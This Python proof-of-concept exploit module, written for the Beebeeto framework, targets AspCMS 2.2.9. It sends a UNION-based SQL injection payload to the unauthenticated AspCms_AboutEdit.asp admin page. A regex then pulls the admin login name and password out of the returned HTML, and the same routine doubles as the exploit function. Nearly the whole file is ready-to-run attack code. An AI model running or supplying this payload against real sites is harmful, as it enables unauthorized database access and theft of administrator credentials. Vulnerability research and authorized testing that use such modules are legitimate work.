#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0038',           # 由Beebeeto官方编辑
            'name': 'AspCMS 2.2.9 /AspCms_AboutEdit.asp SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-29',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ASPCMS',  # 漏洞所涉及的应用名称
            'vul_version': ['2.2.9'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['SQL Injection', 'aspcms', 'SQL注入漏洞'],  # 漏洞相关tag
            'desc': '后台文件 AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-04214'],  # 参考链接
        },
    }


    @classmethod
    def verify(cls, args):
        exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
               "%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,"
               "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
        verify_url = args['options']['target'] + exp
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'#匹配用户名
                             r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?',#匹配密码
                             re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())